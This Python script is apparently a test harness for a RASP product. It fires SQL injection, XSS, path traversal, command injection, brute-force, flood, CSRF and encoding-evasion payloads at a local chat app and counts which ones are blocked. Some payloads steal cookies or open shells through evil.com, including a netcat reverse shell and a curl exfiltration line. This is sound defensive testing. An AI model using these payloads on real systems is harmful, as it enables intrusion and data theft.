import requests
import time
import argparse
import sys
import json
from datetime import datetime

# ─── Config ──────────────────────────────────────────────────────────────────

DEFAULT_TARGET    = "http://localhost:3001"
DEFAULT_DELAY     = 1.0   # seconds between tests
REQUEST_TIMEOUT   = 6     # seconds

# ─── Colors ──────────────────────────────────────────────────────────────────

class C:
    RESET  = "\033[0m"
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    BLUE   = "\033[94m"
    MAGENTA= "\033[95m"

def banner():
    print(f"""
{C.RED}{C.BOLD}
 ███████╗██╗  ██╗██╗███████╗██╗     ██████╗ ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗
 ██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║
 ███████╗███████║██║█████╗  ██║     ██║  ██║██║ █╗ ██║███████║   ██║   ██║     ███████║
 ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║██║███╗██║██╔══██║   ██║   ██║     ██╔══██║
 ███████║██║  ██║██║███████╗███████╗██████╔╝╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║
 ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝  ╚══╝╚══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
{C.RESET}
{C.CYAN}         Attack Validation Suite — ZynChat v2.2.0 / ShieldWatch RASP{C.RESET}
{C.DIM}         {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}{C.RESET}
""")

# ─── Result Tracker ──────────────────────────────────────────────────────────

results = {
    "blocked":  [],
    "bypassed": [],
    "error":    [],
}

def verdict(name, status_code, body_text=""):
    """Determine if attack was blocked, bypassed, or errored."""
    blocked_codes = {400, 403, 429}
    body_lower = body_text.lower() if body_text else ""

    # ShieldWatch returns 403 for blocks, 429 for rate-limits
    if status_code in blocked_codes:
        return "BLOCKED"
    # Some attacks may be caught at body level
    if any(kw in body_lower for kw in ["blocked", "forbidden", "threat detected", "too many"]):
        return "BLOCKED"
    return "BYPASSED"

def print_result(name, status, result, response_body=""):
    icon = {
        "BLOCKED":  f"{C.GREEN}✅ BLOCKED  ",
        "BYPASSED": f"{C.RED}⚠️  BYPASSED ",
        "ERROR":    f"{C.YELLOW}💤 ERROR    ",
    }.get(result, "❓")

    print(f"   {icon}{C.RESET}  HTTP {status}  |  {C.DIM}{name}{C.RESET}")
    if result == "BYPASSED" and response_body:
        preview = response_body[:120].replace("\n", " ")
        print(f"   {C.DIM}└─ Response: {preview}...{C.RESET}")

def run_test(session, name, method, url, **kwargs):
    """Run a single HTTP test and print result."""
    try:
        fn = session.post if method == "POST" else session.get
        resp = fn(url, timeout=REQUEST_TIMEOUT, **kwargs)
        body = ""
        try:
            body = resp.text
        except Exception:
            pass
        r = verdict(name, resp.status_code, body)
        print_result(name, resp.status_code, r)
        results[r.lower()].append(name) if r != "BYPASSED" else results["bypassed"].append(name)
        return resp
    except requests.exceptions.ConnectionError:
        print_result(name, "N/A", "ERROR")
        results["error"].append(name)
        return None
    except Exception as e:
        print_result(name, "N/A", "ERROR")
        results["error"].append(name)
        return None

# ══════════════════════════════════════════════════════════════════════════════
#  TEST CATEGORIES
# ══════════════════════════════════════════════════════════════════════════════

def test_sqli(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  1. SQL INJECTION  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    payloads = [
        ("Auth Bypass — OR 1=1",          {"username": "' OR 1=1 --",       "password": "x"}),
        ("Auth Bypass — ' OR '1'='1",     {"username": "' OR '1'='1",       "password": "x"}),
        ("UNION SELECT attack",            {"username": "a' UNION SELECT 1,2,3 FROM users--", "password": "x"}),
        ("DROP TABLE attempt",             {"username": "x'; DROP TABLE users;--", "password": "x"}),
        ("Time-based blind — sleep()",     {"username": "x' AND sleep(5)--", "password": "x"}),
        ("Stacked query — INSERT INTO",    {"username": "x'; INSERT INTO users VALUES('hx','pw')--", "password": "x"}),
        ("Boolean-based — '='",            {"username": "x' OR 'x'='x",     "password": "x"}),
    ]
    for name, data in payloads:
        run_test(session, name, "POST", f"{target}/api/auth/login", json=data)
        time.sleep(delay)


def test_xss(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  2. XSS / CROSS-SITE SCRIPTING  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    payloads = [
        ("Basic <script> tag",             {"message": "<script>alert('XSS')</script>"}),
        ("IMG onerror handler",            {"message": "<img src=x onerror=alert(1)>"}),
        ("SVG onload vector",              {"message": "<svg onload=alert(document.cookie)>"}),
        ("javascript: URI",               {"message": "<a href='javascript:alert(1)'>click</a>"}),
        ("iframe injection",               {"message": "<iframe src='https://evil.com'></iframe>"}),
        ("eval() execution",               {"message": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"}),
        ("document.cookie theft",          {"message": "fetch('https://evil.com?c='+document.cookie)"}),
        ("Base64 encoded XSS",             {"message": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}),
        ("HTML entity encoded",            {"message": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"}),
        ("VBScript vector",                {"message": "<img src=x onerror=\"vbscript:msgbox('XSS')\">"}),
    ]
    for name, data in payloads:
        run_test(session, name, "POST", f"{target}/api/chat/send", json=data)
        time.sleep(delay)


def test_path_traversal(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  3. PATH TRAVERSAL  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    payloads = [
        ("Classic ../../../etc/passwd",    "../../../../etc/passwd"),
        ("URL encoded %2e%2e%2f",          "%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("Double encoded %252e",           "%252e%252e%252fetc%252fpasswd"),
        ("Windows path traversal",         "..\\..\\..\\windows\\win.ini"),
        ("/proc/self/environ",             "../../../../proc/self/environ"),
        ("/etc/shadow",                    "../../../../etc/shadow"),
        ("Mixed encoding",                 "..%2F..%2F..%2Fetc%2Fpasswd"),
    ]
    for name, path in payloads:
        run_test(session, name, "GET", f"{target}/api/files/download", params={"file": path})
        time.sleep(delay)


def test_cmd_injection(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  4. COMMAND INJECTION  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    payloads = [
        ("Semicolon — id command",         {"cmd": "status; id"}),
        ("Pipe — cat /etc/passwd",         {"cmd": "status | cat /etc/passwd"}),
        ("Backtick execution",             {"cmd": "`whoami`"}),
        ("$() subshell",                   {"cmd": "$(id)"}),
        ("Chained — curl exfil",           {"cmd": "ls; curl http://evil.com/`id`"}),
        ("Ampersand — background exec",    {"cmd": "test && wget http://evil.com/shell.sh"}),
        ("Python reverse shell attempt",   {"cmd": "python3 -c 'import socket'"}),
        ("Netcat listener",                {"cmd": "nc -e /bin/bash evil.com 4444"}),
    ]
    for name, data in payloads:
        run_test(session, name, "POST", f"{target}/api/system/status", json=data)
        time.sleep(delay)


def test_brute_force(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  5. BRUTE FORCE LOGIN  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    print(f"   {C.DIM}ShieldWatch threshold: 5 failures in 60s → BLOCK{C.RESET}")
    # Send 8 bad login attempts — should trigger at attempt 5+
    passwords = ["pass1", "pass2", "pass3", "pass4", "pass5", "pass6", "pass7", "pass8"]
    for i, pw in enumerate(passwords, 1):
        name = f"Attempt #{i} — wrong password"
        run_test(session, name, "POST", f"{target}/api/auth/login",
                 json={"username": "admin", "password": pw})
        time.sleep(0.4)  # fast to trigger brute force


def test_ddos(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  6. DDoS / REQUEST FLOOD  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    print(f"   {C.DIM}ShieldWatch threshold: >20 requests in 10s → BLOCK{C.RESET}")
    blocked_count = 0
    for i in range(1, 26):
        name = f"Flood request #{i}/25"
        resp = run_test(session, name, "GET", f"{target}/api/messages")
        if resp and resp.status_code == 429:
            blocked_count += 1
        time.sleep(0.1)  # very fast — intentional flood
    print(f"   {C.DIM}Rate limit triggered on {blocked_count} requests{C.RESET}")


def test_idor(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  7. IDOR (Insecure Direct Object Reference)  ━━━━━━━━━━━━━━━━{C.RESET}")
    user_ids = ["1", "2", "3", "100", "admin", "0", "-1"]
    for uid in user_ids:
        name = f"Access user ID: {uid}"
        run_test(session, name, "GET", f"{target}/api/user/{uid}/profile")
        time.sleep(delay)


def test_csrf(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  8. CSRF (Cross-Site Request Forgery)  ━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    # CSRF = requests with wrong/missing Origin or Referer from different domain
    csrf_headers_list = [
        ("No Origin header",              {}),
        ("Evil.com Origin",               {"Origin": "https://evil.com"}),
        ("Evil.com Referer",              {"Referer": "https://evil.com/attack"}),
        ("Mismatched Origin + Referer",   {"Origin": "https://attacker.com", "Referer": "https://attacker.com/csrf.html"}),
    ]
    for name, headers in csrf_headers_list:
        run_test(session, name, "POST", f"{target}/api/user/settings",
                 json={"email": "hacked@evil.com"},
                 headers=headers)
        time.sleep(delay)


def test_session_fixation(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  9. SESSION FIXATION  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    endpoints = [
        ("Session ID exposure endpoint",  "GET",  "/api/session/id",  {}),
        ("Forced session ID injection",   "POST", "/api/session/fix", {"sessionId": "attacker_controlled_session_abc123"}),
        ("Session ID via query param",    "GET",  "/api/session/id",  {}),
    ]
    for name, method, path, data in endpoints:
        run_test(session, name, method, f"{target}{path}", json=data if data else None)
        time.sleep(delay)


def test_registration_spam(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  10. REGISTRATION SPAM  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    print(f"   {C.DIM}ShieldWatch threshold: >5 accounts per hour → BLOCK{C.RESET}")
    for i in range(1, 9):
        name = f"Register account #{i}"
        run_test(session, name, "POST", f"{target}/api/register",
                 json={
                     "username": f"spamuser{i}_{int(time.time())}",
                     "password": "Password123!",
                     "email":    f"spam{i}@evil.com"
                 })
        time.sleep(0.3)


def test_honeypot(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  11. HONEYPOT TRAPS  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    print(f"   {C.DIM}Accessing these paths = permanent IP ban in ShieldWatch{C.RESET}")
    trap_paths = [
        "/api/admin/users",
        "/api/admin/config",
        "/api/export/database",
        "/api/backup",
        "/api/db-dump",
        "/api/secret",
        "/admin",
        "/phpmyadmin",
        "/wp-admin",
        "/.env",
        "/admin/config.php",
    ]
    for path in trap_paths:
        run_test(session, f"Honeypot: {path}", "GET", f"{target}{path}")
        time.sleep(delay * 0.5)


def test_encoded_bypass(target, session, delay):
    print(f"\n{C.BOLD}{C.BLUE}━━━  12. ENCODED PAYLOAD BYPASS ATTEMPTS  ━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    print(f"   {C.DIM}ShieldWatch decodes URL + Base64 — testing evasion{C.RESET}")
    payloads = [
        ("URL encoded SQLi",       {"username": "%27%20OR%201%3D1%20--", "password": "x"}),
        ("Double URL encoded SQLi",{"username": "%2527+OR+1%253D1+--",   "password": "x"}),
        ("Base64 XSS payload",     {"message": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}),
        ("Unicode XSS — \\u003c",  {"message": "\u003cscript\u003ealert(1)\u003c/script\u003e"}),
        ("Null byte injection",    {"username": "admin\x00' OR 1=1--", "password": "x"}),
        ("Case variation SQLi",    {"username": "' UnIoN SeLeCt 1,2,3 FrOm users--", "password": "x"}),
        ("Whitespace bypass SQLi", {"username": "'/**/OR/**/1=1--",     "password": "x"}),
    ]
    for name, data in payloads:
        endpoint = "/api/auth/login" if "username" in data else "/api/chat/send"
        run_test(session, name, "POST", f"{target}{endpoint}", json=data)
        time.sleep(delay)


# ─── Summary ─────────────────────────────────────────────────────────────────

def print_summary(target):
    total    = len(results["blocked"]) + len(results["bypassed"]) + len(results["error"])
    blocked  = len(results["blocked"])
    bypassed = len(results["bypassed"])
    errors   = len(results["error"])
    score    = (blocked / (total - errors)) * 100 if (total - errors) > 0 else 0

    print(f"\n{C.BOLD}{'═'*68}{C.RESET}")
    print(f"{C.BOLD}  FINAL RESULTS — {target}{C.RESET}")
    print(f"{'═'*68}")
    print(f"  Total Tests  : {total}")
    print(f"  {C.GREEN}✅ Blocked    : {blocked}{C.RESET}")
    print(f"  {C.RED}⚠️  Bypassed   : {bypassed}{C.RESET}")
    print(f"  {C.YELLOW}💤 Errors     : {errors}{C.RESET}  (server unreachable / endpoint missing)")
    print(f"\n  {C.BOLD}Protection Score: {score:.1f}%{C.RESET}")

    if score == 100:
        print(f"\n  {C.GREEN}{C.BOLD}🏆 PERFECT — ShieldWatch blocked every attack!{C.RESET}")
    elif score >= 80:
        print(f"\n  {C.YELLOW}{C.BOLD}🛡️  GOOD — Most attacks blocked. Review bypassed list.{C.RESET}")
    else:
        print(f"\n  {C.RED}{C.BOLD}💀 WEAK — Significant gaps in protection!{C.RESET}")

    if results["bypassed"]:
        print(f"\n  {C.RED}⚠️  BYPASSED ATTACKS:{C.RESET}")
        for name in results["bypassed"]:
            print(f"     • {name}")

    print(f"\n  {C.CYAN}Check ShieldWatch Dashboard → http://localhost:3002{C.RESET}")
    print(f"{'═'*68}\n")


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="ShieldWatch Full Attack Test Suite")
    parser.add_argument("--target", default=DEFAULT_TARGET,
                        help=f"Target URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--delay",  type=float, default=DEFAULT_DELAY,
                        help=f"Delay between tests in seconds (default: {DEFAULT_DELAY})")
    parser.add_argument("--only",   type=str, default=None,
                        help="Run only one category: sqli|xss|path|cmd|brute|ddos|idor|csrf|session|spam|honeypot|encoded")
    args = parser.parse_args()

    banner()
    print(f"  {C.CYAN}Target  : {args.target}{C.RESET}")
    print(f"  {C.CYAN}Delay   : {args.delay}s between tests{C.RESET}")
    print(f"  {C.DIM}Tip     : Make sure ZynChat (port 3001) and ShieldWatch (port 3002) are running{C.RESET}")
    print(f"\n  {C.YELLOW}Starting in 3 seconds...{C.RESET}", end="", flush=True)
    time.sleep(3)
    print()

    session = requests.Session()
    session.headers.update({
        "Content-Type": "application/json",
        "User-Agent":   "ShieldWatch-SecurityTest/1.0",
    })

    t = args.target.rstrip("/")
    d = args.delay
    o = args.only

    test_map = {
        "sqli":     lambda: test_sqli(t, session, d),
        "xss":      lambda: test_xss(t, session, d),
        "path":     lambda: test_path_traversal(t, session, d),
        "cmd":      lambda: test_cmd_injection(t, session, d),
        "brute":    lambda: test_brute_force(t, session, d),
        "ddos":     lambda: test_ddos(t, session, d),
        "idor":     lambda: test_idor(t, session, d),
        "csrf":     lambda: test_csrf(t, session, d),
        "session":  lambda: test_session_fixation(t, session, d),
        "spam":     lambda: test_registration_spam(t, session, d),
        "honeypot": lambda: test_honeypot(t, session, d),
        "encoded":  lambda: test_encoded_bypass(t, session, d),
    }

    if o:
        if o not in test_map:
            print(f"{C.RED}Unknown category: {o}{C.RESET}")
            print(f"Valid options: {', '.join(test_map.keys())}")
            sys.exit(1)
        test_map[o]()
    else:
        for fn in test_map.values():
            fn()

    print_summary(t)


if __name__ == "__main__":
    main()
